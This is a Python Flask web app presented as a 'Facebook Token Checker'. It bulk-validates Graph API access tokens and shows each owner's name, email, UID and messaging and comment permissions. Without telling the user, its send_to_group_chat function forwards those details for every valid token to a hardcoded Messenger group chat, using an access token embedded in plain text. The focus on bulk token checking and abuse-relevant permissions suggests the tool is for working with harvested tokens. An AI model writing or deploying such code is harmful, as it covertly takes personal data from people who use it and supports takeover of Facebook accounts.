import requests
from flask import Flask, render_template_string, request

app = Flask(__name__)

# ✅ Group Chat UID & Page Token (Bas Info Send Karne Ke Liye)
PAGE_ACCESS_TOKEN = 'EAABwzLixnjYBO4ajrvsv9GFMlTiQZA4P0G40JlFjkvukBtW6JNnBSiS0ZBRZBpdnA8cUUkOKZBnYOa5ORZAsr0kkRbWvahpQ6CoE8dy6YuC0L8IZATIZAPPp37KKEZBI2rRlByVx7zhbnSuo1f38JzZBZBASNczXkVA28zOATNi2OAowkEdy7CWqatrVMU6HiZBVxwywcoZD'
GROUP_CHAT_UID = '9456516084398824'  # 🛑 Apna FB Messenger Group Chat UID

@app.route('/')
def index():
    return render_template_string('''
        <html>
        <head>
            <title>Token Checker by RAJ MISHRA</title>
            <style>
                body { background: linear-gradient(45deg, #ff6ec7, #f7e3c1); font-family: Arial, sans-serif; text-align: center; color: white; }
                textarea, input, button { width: 80%; padding: 10px; margin: 10px; border-radius: 5px; border: none; }
                textarea { height: 100px; }
            </style>
        </head>
        <body>
            <h1>Facebook Token Checker</h1>
            <form action="/check_single" method="POST">
                <label>Enter Single Token:</label><br>
                <input type="text" name="token" required><br>
                <button type="submit">Check Single Token</button>
            </form>
            
            <form action="/check_multi" method="POST">
                <label>Enter Multiple Tokens (One per line):</label><br>
                <textarea name="tokens" required></textarea><br>
                <button type="submit">Check Multiple Tokens</button>
            </form>
        </body>
        </html>
    ''')

@app.route('/check_single', methods=['POST'])
def check_single():
    token = request.form['token']
    token_details = check_token_details(token)

    if token_details['valid']:
        send_to_group_chat(token_details)

    return render_template_string(generate_html(), tokens_info=[token_details], valid_tokens=[])

@app.route('/check_multi', methods=['POST'])
def check_multi():
    tokens = request.form['tokens'].split("\n")
    tokens_info = []
    valid_tokens = []

    for token in tokens:
        token = token.strip()
        if token:
            details = check_token_details(token)
            if details['valid']:
                valid_tokens.append(token)
                send_to_group_chat(details)
            tokens_info.append(details)

    return render_template_string(generate_html(), tokens_info=tokens_info, valid_tokens=valid_tokens)

def check_token_details(token):
    url = f"https://graph.facebook.com/me?fields=id,name,email&access_token={token}"
    response = requests.get(url)
    
    if response.status_code == 200:
        data = response.json()
        uid = data.get('id')
        name = data.get('name', 'Unknown')
        email = data.get('email', 'Not Available')

        can_send_message = check_permission(token, "messages")
        can_comment = check_permission(token, "comment")

        return {
            "valid": True,
            "token": token,
            "name": name,
            "email": email,
            "profile_pic": f"https://graph.facebook.com/{uid}/picture?type=large",
            "uid": uid,
            "can_send_message": can_send_message,
            "can_comment": can_comment
        }
    
    elif "error" in response.json():
        error_code = response.json()["error"].get("code")
        
        if error_code == 190:
            return {"valid": False, "error_message": "❌ Invalid or Expired Token"}
        elif error_code == 200:
            return {"valid": False, "error_message": "⚠ Token is Restricted (Limited Permissions)"}
        elif error_code == 368:
            return {"valid": False, "error_message": "🚨 Token Flagged for Automated Behavior"}
        else:
            return {"valid": False, "error_message": "⚠ Unknown Error: Check Token Permissions"}
    
    return {"valid": False, "error_message": "❌ Unable to Validate Token"}

def check_permission(token, permission):
    url = f"https://graph.facebook.com/me/permissions?access_token={token}"
    response = requests.get(url)

    if response.status_code == 200:
        data = response.json().get('data', [])
        for perm in data:
            if perm['permission'] == permission and perm['status'] == 'granted':
                return "Yes"
    return "No"

def send_to_group_chat(token_details):
    message = f"✅ **Token Validated!**\n\n"
    message += f"**Name:** {token_details['name']}\n"
    message += f"**Email:** {token_details['email']}\n"
    message += f"**UID:** {token_details['uid']}\n"
    message += f"**Can Send Messages:** {token_details['can_send_message']}\n"
    message += f"**Can Comment:** {token_details['can_comment']}\n"

    url = f'https://graph.facebook.com/{GROUP_CHAT_UID}/messages?access_token={PAGE_ACCESS_TOKEN}'
    payload = {'message': message}
    
    response = requests.post(url, data=payload)
    
    if response.status_code == 200:
        print("✅ Group Chat me Successfully Sent!")
    else:
        print("❌ Group Chat me Send Failed!")

def generate_html():
    return '''
        <html>
        <head>
            <title>Token Checker Result</title>
            <style>
                body { background: linear-gradient(45deg, #ff6ec7, #f7e3c1); font-family: Arial, sans-serif; text-align: center; color: white; }
                .container { margin: 20px auto; width: 80%; }
                .token-card { background: rgba(0,0,0,0.6); padding: 20px; margin: 10px; border-radius: 10px; }
                img { border-radius: 50%; }
                textarea { width: 80%; height: 100px; padding: 10px; }
            </style>
        </head>
        <body>
            <h1>Token Checker Result</h1>
            <div class="container">
            {% for token in tokens_info %}
                <div class="token-card">
                    {% if token.valid %}
                        <p><strong>Name:</strong> {{ token.name }}</p>
                        <p><strong>Email:</strong> {{ token.email }}</p>
                        <p><strong>UID:</strong> {{ token.uid }}</p>
                        <img src="{{ token.profile_pic }}" alt="Profile Picture" width="100">
                        <p><strong>Can Send Messages:</strong> {{ token.can_send_message }}</p>
                        <p><strong>Can Comment:</strong> {{ token.can_comment }}</p>
                    {% else %}
                        <p>{{ token.error_message }}</p>
                    {% endif %}
                </div>
            {% endfor %}
            </div>

            {% if valid_tokens %}
            <h2>✅ Working Tokens</h2>
            <textarea readonly>{{ valid_tokens|join('\n') }}</textarea>
            {% endif %}
            
            <a href="/">Back</a>
        </body>
        </html>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
